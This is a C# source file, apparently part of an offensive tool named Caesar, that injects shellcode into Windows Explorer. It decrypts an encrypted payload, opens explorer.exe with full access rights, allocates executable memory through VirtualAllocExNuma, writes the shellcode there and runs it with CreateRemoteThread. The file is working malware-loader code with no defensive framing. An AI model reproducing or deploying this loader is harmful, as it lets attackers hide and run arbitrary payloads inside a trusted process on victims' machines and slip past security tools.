using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Caesar
{
    public class Injection
    {
		// DLLs
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		// METHODS
		public static void Inject(byte[] buf)
        {
			// decrypt shellcode. call caesar.encryption.decrypt
			buf = Encryption.Decrypt(buf);

			// get explorer handle
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("explorer")[0].Id);
			// alloc memory
			IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
			if (addr == null)
			{
				return;
			}
			IntPtr outSize;
			// write shellcode
			WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
			// start new thread
			IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
		}
    }
}
